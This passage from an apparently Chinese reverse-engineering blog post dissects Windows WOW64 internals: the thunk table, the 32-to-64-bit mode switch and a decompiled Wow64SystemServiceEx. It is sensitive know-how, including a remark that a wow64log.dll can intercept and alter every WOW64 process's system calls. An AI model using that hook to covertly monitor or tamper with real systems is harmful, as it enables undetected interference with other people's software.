DATA XREF: BTCpuTurboThunkControl+111↑w</span><br><span class="line">.rdata:000000006B104800 8F 1C 10 6B 00 00 00 00        off_6B104800    dq offset Thunk4ArgSpSpNSpNSp</span><br><span class="line">.rdata:000000006B104800                                                                        ; DATA XREF: BTCpuTurboThunkControl+118↑w</span><br><span class="line">.rdata:000000006B104808 BE 1A 10 6B 00 00 00 00        off_6B104808    dq offset Thunk4ArgSpSpNSpNSpReloadState</span><br><span class="line">.rdata:000000006B104808                                                                        ; DATA XREF: BTCpuTurboThunkControl+11F↑w</span><br><span class="line">.rdata:000000006B104810 A0 1C 10 6B 00 00 00 00        off_6B104810    dq offset Thunk4ArgSpNSpNSpNSp</span><br><span class="line">.rdata:000000006B104810                                                                        ; DATA XREF: BTCpuTurboThunkControl+126↑w</span><br><span class="line">.rdata:000000006B104818 42 1B 10 6B 00 00 00 00        off_6B104818    dq offset Thunk4ArgSpNSpNSpNSpReloadState</span><br><span class="line">.rdata:000000006B104818                                                                        ; DATA XREF: BTCpuTurboThunkControl+12D↑w</span><br><span class="line">.rdata:000000006B104820 42 1C 10 6B 00 00 00 00        off_6B104820    dq offset Thunk4ArgNSpSpNSpNSp</span><br><span class="line">.rdata:000000006B104820                                                                        ; DATA XREF: BTCpuTurboThunkControl+134↑w</span><br><span class="line">.rdata:000000006B104828 53 1C 10 6B 00 00 00 00        off_6B104828    dq offset Thunk4ArgSpSpSpNSp</span><br><span class="line">.rdata:000000006B104828                                                                        ; DATA XREF: BTCpuTurboThunkControl+13B↑w</span><br><span class="line">.rdata:000000006B104830 F5 17 10 6B 00 00 00 00        off_6B104830    dq offset QuerySystemTime</span><br><span class="line">.rdata:000000006B104830                                                                        ; DATA XREF: BTCpuTurboThunkControl+142↑w</span><br><span class="line">.rdata:000000006B104838 C4 17 10 6B 00 00 00 00        off_6B104838    dq offset GetCurrentProcessorNumber</span><br><span class="line">.rdata:000000006B104838                                                                        ; DATA XREF: BTCpuTurboThunkControl+149↑w</span><br><span class="line">.rdata:000000006B104840 6F 19 10 6B 00 00 00 00        off_6B104840    dq offset ReadWriteFile ; DATA XREF: BTCpuTurboThunkControl+150↑w</span><br><span class="line">.rdata:000000006B104848 BF 18 10 6B 00 00 00 00        off_6B104848    dq offset DeviceIoctlFile</span><br><span class="line">.rdata:000000006B104848                                                                        ; DATA XREF: BTCpuTurboThunkControl+157↑w</span><br><span class="line">.rdata:000000006B104850 16 1A 10 6B 00 00 00 00        off_6B104850    dq offset RemoveIoCompletion</span><br><span class="line">.rdata:000000006B104850                                                                        ; DATA XREF: BTCpuTurboThunkControl+15E↑w</span><br><span class="line">.rdata:000000006B104858 2B 18 10 6B 00 00 00 00        off_6B104858    dq offset WaitForMultipleObjects</span><br><span class="line">.rdata:000000006B104858                                                                        ; DATA XREF: BTCpuTurboThunkControl+165↑w</span><br><span class="line">.rdata:000000006B104860 32 18 10 6B 00 00 00 00        off_6B104860    dq offset WaitForMultipleObjects32</span><br><span class="line">.rdata:000000006B104860                                                                        ; DATA XREF: BTCpuTurboThunkControl+16C↑w</span><br><span class="line">.rdata:000000006B104868 79 17 10 6B 00 00 00 00        off_6B104868    dq offset CpupReturnFromSimulatedCode</span><br><span class="line">.rdata:000000006B104868                                                                        ; DATA XREF: BTCpuTurboThunkControl+32↑r</span><br><span class="line">.rdata:000000006B104870 C3 17 10 6B 00 00 00 00                        dq offset ThunkNone</span><br></pre></td></tr></table></figure>

<p>其中最后一个函数<code>CpupReturnFromSimulatedCode</code>是32位走回64位元的第一个64位入口函数。当32位程式踩到任何32位系统函数要进行系统中断时，踩入该函数，对当前32位执行状态进行备份，接着跳入<code>TurboDispatchJumpAddressEnd</code>,，其内部以ntdll64.dll的函数进行仿真当前收到的32位系统中断。<code>TurboDispatchJumpAddressEnd</code>用于呼叫<code>wow64!Wow64SystemServiceEx</code>完成仿真32位系统中断，完成后从上次<code>CpupReturnFromSimulatedCode</code>备份的执行状态进行恢复，跳回上次32位程式呼叫Win32 API的返回地址并接着执行。</p>
<h3 id="NtAPI过渡层Trampoline"><a href="#NtAPI过渡层Trampoline" class="headerlink" title="NtAPI过渡层Trampoline"></a>NtAPI过渡层Trampoline</h3><p>ntdll32的过渡层函数上面有，调用的<code>ntdll32!Wow64SystemServiceCall</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wow64cpu.dll+6000 jmp 0033:wow64cpu.dll+6009</span><br><span class="line">wow64cpu.dll+6007 add [rax],al</span><br><span class="line">wow64cpu.dll+6009 jmp qword ptr [r15+000000F8] ;跳转至CpupReturnFromSimulatedCode</span><br></pre></td></tr></table></figure>

<p>6000处区段暂存器CS值决定当前Intel晶片应当以哪一种指令集来解析Program Counter上的程式码，+6009h处开始的程式码就是Intel x64组合语言指令。不同CS暂存器值组合与意义为：</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0x23</td>
<td>WOW64架构中32位执行模式</td>
</tr>
<tr>
<td>0x33</td>
<td>原生64位执行状态</td>
</tr>
<tr>
<td>0x1B</td>
<td>原生32位执行状态</td>
</tr>
</tbody></table>
<p>最后跳转的<code>CpupReturnFromSimulatedCode</code>用于备份当下32执行绪运行状态：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.text:000000006B101779                             CpupReturnFromSimulatedCode:            ; CODE XREF: sub_6B103024+4↓j</span><br><span class="line">.text:000000006B101779                                                                     ; DATA XREF: BTCpuResetToConsistentState+96↓o ...</span><br><span class="line">.text:000000006B101779 000 49 87 E6                                xchg    rsp, r14        ; Exchange Register/Memory with Register 将当前程式使用的32堆叠从暂存器RSP取出并放到暂存器R14 并将64位堆叠从暂存器R14取出作为接下来64位WOW64翻译阶段使用的当前主要对鞋</span><br><span class="line">.text:000000006B10177C 000 45 8B 06                                mov     r8d, [r14] ;从32位执行绪堆叠上取出此次系统中断返回地址</span><br><span class="line">.text:000000006B10177F 000 49 83 C6 04                             add     r14, 4          ; Add</span><br><span class="line">.text:000000006B101783 000 45 89 45 3C                             mov     [r13+3Ch], r8d ;上面获取的返回地址存入暂存器R13保存的32位执行绪快照EIP 后者在wow64cpu!RunSimulatedCode中完成初始化</span><br><span class="line">.text:000000006B101787 000 45 89 75 48                             mov     [r13+48h], r14d</span><br><span class="line">.text:000000006B10178B 000 4D 8D 5E 04                             lea     r11, [r14+4]    ; Load Effective Address 当前系统函数参数位址</span><br><span class="line">.text:000000006B10178F 000 41 89 7D 20                             mov     [r13+20h], edi ;下面这些都保存一份到32位执行绪快照记录</span><br><span class="line">.text:000000006B101793 000 41 89 75 24                             mov     [r13+24h], esi</span><br><span class="line">.text:000000006B101797 000 41 89 5D 28                             mov     [r13+28h], ebx</span><br><span class="line">.text:000000006B10179B 000 41 89 6D 38                             mov     [r13+38h], ebp</span><br><span class="line">.text:000000006B10179F 000 9C                                      pushfq                  ; Push Flags Register onto the Stack (use64)</span><br><span class="line">.text:000000006B1017A0 008 41 58                                   pop     r8</span><br><span class="line">.text:000000006B1017A2 000 45 89 45 44                             mov     [r13+44h], r8d</span><br><span class="line">.text:000000006B1017A6                             ; Exported entry   9. TurboDispatchJumpAddressStart</span><br><span class="line">.text:000000006B1017A6</span><br><span class="line">.text:000000006B1017A6                                             public TurboDispatchJumpAddressStart</span><br><span class="line">.text:000000006B1017A6                             TurboDispatchJumpAddressStart:          ; DATA XREF: .rdata:off_6B1048A8↓o</span><br><span class="line">.text:000000006B1017A6 000 8B C8                                   mov     ecx, eax ;上述eax保存当前欲呼叫的系统函数识别码</span><br><span class="line">.text:000000006B1017A8 000 C1 E9 10                                shr     ecx, 10h        ; Shift Logical Right 计算RCX</span><br><span class="line">.text:000000006B1017AB 000 41 FF 24 CF                             jmp     qword ptr [r15+rcx*8] ; Indirect Near Jump 跳转Switch表TurboThunkDispatch</span><br><span class="line">.text:000000006B1017AF                             ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000006B1017AF                             ; Exported entry   8. TurboDispatchJumpAddressEnd</span><br><span class="line">.text:000000006B1017AF</span><br><span class="line">.text:000000006B1017AF                                             public TurboDispatchJumpAddressEnd</span><br><span class="line">.text:000000006B1017AF                             TurboDispatchJumpAddressEnd:            ; CODE XREF: RunSimulatedCode+274↓j 仿真当前32位系统中断为64位系统中断</span><br><span class="line">.text:000000006B1017AF                                                                     ; RunSimulatedCode+324↓j</span><br><span class="line">.text:000000006B1017AF                                                                     ; DATA XREF: ...</span><br><span class="line">.text:000000006B1017AF 0A8 8B C8                                   mov     ecx, eax ;当前欲呼叫的NtAPI系统函数识别码</span><br><span class="line">.text:000000006B1017B1 0A8 49 8B D3                                mov     rdx, r11 ;32位参数起点 即C/C++的va_start</span><br><span class="line">.text:000000006B1017B4 0A8 FF 15 2E 2A 00 00                       call    cs:__imp_Wow64SystemServiceEx ; Indirect Call Near Procedure</span><br><span class="line">.text:000000006B1017BA 0A8 41 89 45 34                             mov     [r13+34h], eax ;放入32位执行绪快照记录EAX中</span><br><span class="line">.text:000000006B1017BE 0A8 E9 BC FE FF FF                          jmp     loc_6B10167F    ; Jump</span><br><span class="line">;...</span><br><span class="line">.text:000000006B10167F                             loc_6B10167F:                           ; CODE XREF: RunSimulatedCode+16E↓j</span><br><span class="line">.text:000000006B10167F 0A8 41 0F BA 75 80 00                       btr     dword ptr [r13-80h], 0 ; Bit Test and Reset</span><br><span class="line">.text:000000006B101685 0A8 72 37                                   jb      short loc_6B1016BE ; Jump if Below (CF=1)</span><br><span class="line">.text:000000006B101687 0A8 41 8B 7D 20                             mov     edi, [r13+20h] ;恢复32位执行绪快照记录</span><br><span class="line">.text:000000006B10168B 0A8 41 8B 75 24                             mov     esi, [r13+24h]</span><br><span class="line">.text:000000006B10168F 0A8 41 8B 5D 28                             mov     ebx, [r13+28h]</span><br><span class="line">.text:000000006B101693 0A8 41 8B 6D 38                             mov     ebp, [r13+38h]</span><br><span class="line">.text:000000006B101697 0A8 41 8B 45 34                             mov     eax, [r13+34h]</span><br><span class="line">.text:000000006B10169B 0A8 4C 8B F4                                mov     r14, rsp</span><br><span class="line">.text:000000006B10169E 0A8 C7 44 24 04 23 00 00 00                 mov     dword ptr [rsp+0A8h+var_A8+4], 23h ; &#x27;#&#x27;</span><br><span class="line">.text:000000006B1016A6 0A8 41 B8 2B 00 00 00                       mov     r8d, 2Bh ; &#x27;+&#x27;</span><br><span class="line">.text:000000006B1016AC 0A8 41 8E D0                                mov     ss, r8d</span><br><span class="line">.text:000000006B1016AF 0A8 45 8B 4D 3C                             mov     r9d, [r13+3Ch]</span><br><span class="line">.text:000000006B1016B3 0A8 44 89 0C 24                             mov     dword ptr [rsp+0A8h+var_A8], r9d</span><br><span class="line">.text:000000006B1016B7 0A8 41 8B 65 48                             mov     esp, [r13+48h]</span><br><span class="line">.text:000000006B1016BB 0A8 41 FF 2E                                jmp     fword ptr [r14] ; Indirect Far Jump 跳回32位原程式返回地址 写回CS为0x23</span><br></pre></td></tr></table></figure>

<p>任意一个WOW64执行绪至少有两个独立的执行绪堆叠参与，分别为32位执行绪堆叠和64位执行绪堆叠，前者位WOW64执行绪程式本身使用的堆叠，后者只有从32位切回64位时才使用。</p>
<h3 id="天堂翻译机核心"><a href="#天堂翻译机核心" class="headerlink" title="天堂翻译机核心"></a>天堂翻译机核心</h3><p>该核心即为<code>Wow64SystemServiceEx</code>。例如<code>NtOpenProcess</code>导出函数为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:4B2F67C0                                ; __stdcall ZwOpenProcess(x, x, x, x)</span><br><span class="line">.text:4B2F67C0                                                public _ZwOpenProcess@16</span><br><span class="line">.text:4B2F67C0                                _ZwOpenProcess@16 proc near             ; CODE XREF: RtlpQueryCriticalSectionOwner(x,x)+4E↓p</span><br><span class="line">.text:4B2F67C0                                                                        ; RtlQueryProcessDebugInformation(x,x,x)+131↓p ...</span><br><span class="line">.text:4B2F67C0 000 B8 26 00 00 00                             mov     eax, 26h ; &#x27;&amp;&#x27;  ; NtOpenProcess</span><br><span class="line">.text:4B2F67C5 000 BA 30 8C 31 4B                             mov     edx, offset _Wow64SystemServiceCall@0 ; Wow64SystemServiceCall()</span><br><span class="line">.text:4B2F67CA 000 FF D2                                      call    edx ; Wow64SystemServiceCall() ; Indirect Call Near Procedure</span><br><span class="line">.text:4B2F67CC 000 C2 10 00                                   retn    10h             ; Return Near from Procedure</span><br><span class="line">.text:4B2F67CC                                _ZwOpenProcess@16 endp</span><br></pre></td></tr></table></figure>

<p>例如上面26h即为系统函数识别码，该识别码其实是个结构，两个成员组成一个二维矩阵索引值。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WOW64_SYSTEM_SERVICE</span>&#123;</span><br><span class="line">    USHORT SystemCallNumber:<span class="number">12</span>; <span class="comment">//函数识别码</span></span><br><span class="line">    USHOT ServiceTableIndex:<span class="number">4</span>; <span class="comment">//系统函数表辨识码</span></span><br><span class="line">&#125;WOW64_SYSTEM_SERVICE,*PWOW64_SYSTEM_SERVICE;</span><br></pre></td></tr></table></figure>

<p>该二维矩阵即为<code>wow64!sdwhnt32JumpTable</code>全域指针表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00000001800385F0 30 34 01 80 01 00 00 00     sdwhnt32JumpTable dq offset whNtAccessCheck</span><br><span class="line">.rdata:00000001800385F0                                                                     ; DATA XREF: .rdata:sdwhnt32↑o</span><br><span class="line">.rdata:00000001800385F8 D0 66 03 80 01 00 00 00                     dq offset whNtWorkerFactoryWorkerReady</span><br><span class="line">.rdata:0000000180038600 40 5D 02 80 01 00 00 00                     dq offset whNtAcceptConnectPort</span><br><span class="line">.rdata:0000000180038608 30 C2 02 80 01 00 00 00                     dq offset whNtMapUserPhysicalPagesScatter</span><br><span class="line">.rdata:0000000180038610 10 66 03 80 01 00 00 00                     dq offset whNtWaitForSingleObject</span><br><span class="line">.rdata:0000000180038618 90 79 00 80 01 00 00 00                     dq offset whNtCallbackReturn</span><br><span class="line">.rdata:0000000180038620 C0 DC 01 80 01 00 00 00                     dq offset whNtReadFile</span><br><span class="line">.rdata:0000000180038628 F0 A9 02 80 01 00 00 00                     dq offset whNtDeviceIoControlFile</span><br><span class="line">.rdata:0000000180038630 70 E3 01 80 01 00 00 00                     dq offset whNtWriteFile</span><br><span class="line">;...</span><br></pre></td></tr></table></figure>

<p>翻译机函数程式码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Wow64SystemServiceEx</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_TEB</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_TEB</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 SpareUlong0; <span class="comment">// rax</span></span><br><span class="line">  PVOID *v8; <span class="comment">// r14</span></span><br><span class="line">  __int64 (__fastcall *v9)(__int64); <span class="comment">// rsi</span></span><br><span class="line">  PVOID *v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 **v11; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  __int64 *v15; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> VirtualMemory; <span class="comment">// [rsp+20h] [rbp-898h]</span></span><br><span class="line">  PVOID v17; <span class="comment">// [rsp+38h] [rbp-880h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+40h] [rbp-878h]</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">8</span>]; <span class="comment">// [rsp+48h] [rbp-870h] BYREF</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+50h] [rbp-868h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+58h] [rbp-860h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+5Ch] [rbp-85Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v23; <span class="comment">// [rsp+60h] [rbp-858h]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [rsp+64h] [rbp-854h]</span></span><br><span class="line">  PVOID *v25; <span class="comment">// [rsp+68h] [rbp-850h]</span></span><br><span class="line">  PVOID v26; <span class="comment">// [rsp+70h] [rbp-848h] BYREF</span></span><br><span class="line">  _QWORD v27[<span class="number">259</span>]; <span class="comment">// [rsp+78h] [rbp-840h] BYREF</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+890h] [rbp-28h] BYREF</span></span><br><span class="line">  v17 = <span class="built_in">NtCurrentTeb</span>()-&gt;TlsSlots[<span class="number">12</span>];</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">NtCurrentTeb</span>()-&gt;TlsSlots[<span class="number">12</span>] = &amp;v17;</span><br><span class="line">  v4 = (a1 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v5 = a1 &amp; <span class="number">0xFFF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v5 &gt; <span class="built_in">LODWORD</span>(ServiceTables[<span class="number">3</span> * v4 + <span class="number">1</span>]) ) &#123; <span class="comment">//先检查二维索引值是否在指针表范围内</span></span><br><span class="line">    VirtualMemory = <span class="number">-1073741796</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="built_in">NtCurrentTeb</span>();</span><br><span class="line">  SpareUlong0 = (<span class="type">int</span>)v6-&gt;SpareUlong0;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)SpareUlong0 )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)SpareUlong0 &lt; <span class="number">0</span> )</span><br><span class="line">      v3 = v6;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = (<span class="keyword">struct</span> _TEB *)((<span class="type">char</span> *)v6 + SpareUlong0);</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = &amp;v6-&gt;TlsSlots[<span class="number">3</span>];</span><br><span class="line">  v25 = &amp;v6-&gt;TlsSlots[<span class="number">3</span>];</span><br><span class="line">  v26 = v6-&gt;TlsSlots[<span class="number">3</span>];</span><br><span class="line">  v27[<span class="number">1</span>] = v27;</span><br><span class="line">  v27[<span class="number">0</span>] = v27;</span><br><span class="line">  v27[<span class="number">2</span>] = &amp;v28;</span><br><span class="line">  v6-&gt;TlsSlots[<span class="number">3</span>] = &amp;v26;</span><br><span class="line">  v9 = *(__int64 (__fastcall **)(__int64))(*(_QWORD *)&amp;ServiceTables[<span class="number">3</span> * v4] + <span class="number">8</span> * v5); <span class="comment">//从sdwhnt32JumpTable中提取对应回调函数指针 并呼叫该指针完成一次32位系统中断仿真</span></span><br><span class="line">  v21 = (a1 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v22 = a1 &amp; <span class="number">0xFFF</span>;</span><br><span class="line">  v6-&gt;LastErrorValue = <span class="built_in">HIDWORD</span>(v3-&gt;NtTib.Self);</span><br><span class="line">  <span class="keyword">if</span> ( pfnWow64LogSystemService ) &#123;</span><br><span class="line">    v20 = a2</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Wow64LogSystemServiceWrapper</span>(v19);</span><br><span class="line">    VirtualMemory = <span class="built_in">v9</span>(a2);</span><br><span class="line">    v24 = <span class="number">1</span>;</span><br><span class="line">    v23 = VirtualMemory;</span><br><span class="line">    <span class="built_in">Wow64LogSystemServiceWrapper</span>(v19);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == whNtCallbackReturn ) <span class="comment">//为一些高频使用的系统API进行加速效能考量 不用真的送出64位系统中断也能完成此次系统中断仿真</span></span><br><span class="line">    VirtualMemory = <span class="built_in">whNtCallbackReturn</span>(a2);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == whNtGetWriteWatch )</span><br><span class="line">    VirtualMemory = <span class="built_in">whNtGetWriteWatch</span>(a2);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == whNtSetTimerEx )</span><br><span class="line">    VirtualMemory = <span class="built_in">whNtSetTimerEx</span>(a2);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == whNtFreeVirtualMemory )</span><br><span class="line">    VirtualMemory = <span class="built_in">whNtFreeVirtualMemory</span>(a2);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == whNtAllocateVirtualMemory )</span><br><span class="line">    VirtualMemory = <span class="built_in">whNtAllocateVirtualMemory</span>(a2);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    VirtualMemory = <span class="built_in">v9</span>(a2);</span><br><span class="line">  <span class="built_in">HIDWORD</span>(v3-&gt;NtTib.Self) = v6-&gt;LastErrorValue;</span><br><span class="line">  v10 = (PVOID *)*v8;</span><br><span class="line">  v11 = (__int64 **)((<span class="type">char</span> *)*v8 + <span class="number">8</span>);</span><br><span class="line">  v12 = *v11;</span><br><span class="line">  v13 = **v11;</span><br><span class="line">  <span class="keyword">if</span> ( (__int64 **)(*v11)[<span class="number">1</span>] != v11 || *(__int64 **)(v13 + <span class="number">8</span>) != v12 )</span><br><span class="line">LABEL_25:</span><br><span class="line">    __fastfail(<span class="number">3u</span>);</span><br><span class="line">  *v11 = (__int64 *)v13;</span><br><span class="line">  <span class="keyword">for</span> ( *(_QWORD *)(v13 + <span class="number">8</span>) = v11; v12 != (__int64 *)v11; v15[<span class="number">1</span>] = (__int64)v11 ) &#123;</span><br><span class="line">    <span class="built_in">RtlFreeHeap</span>(<span class="built_in">NtCurrentPeb</span>()-&gt;ProcessHeap, <span class="number">0</span>, v12);</span><br><span class="line">    v12 = *v11;</span><br><span class="line">    v15 = (__int64 *)**v11;</span><br><span class="line">    <span class="keyword">if</span> ( (__int64 **)(*v11)[<span class="number">1</span>] != v11 || (__int64 *)v15[<span class="number">1</span>] != v12 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    *v11 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  *v8 = *v10;</span><br><span class="line">LABEL_22:</span><br><span class="line">  <span class="built_in">NtCurrentTeb</span>()-&gt;TlsSlots[<span class="number">12</span>] = v17;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(Wow64InfoPtr + <span class="number">8</span>) &amp;&amp; (v18 &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; (v18 &amp; <span class="number">4</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">Wow64SetupForInstrumentationReturn</span>();</span><br><span class="line">  <span class="keyword">return</span> VirtualMemory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中在上述57~63行为微软偷偷设计的暗门，可监控全电脑上所有正在运行的WOW64进程呼叫了哪些32位NtAPI并允许在呼叫前修改参数或修改呼叫的返回值。其内部先确认系统槽是否有wow64log.dll，有则调用前告知系统函数欲参数，调用后通知执行结果。</p>
<p>对于翻译过程，例如<code>whNtOpenProcess</code>。WOW64翻译层即为将遵守x86呼叫约制的原始32位系统中断的参数内容重新解析，并以对应64位资料结构重新封装，最终以x64呼叫约制对ntdll64.dll导出的API进行调用。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __fastcall <span class="title">whNtOpenProcess</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1)</span> </span>&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// rsi</span></span><br><span class="line">  ACCESS_MASK v2; <span class="comment">// r14d</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> **v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span> *p_ClientId; <span class="comment">// r9</span></span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// 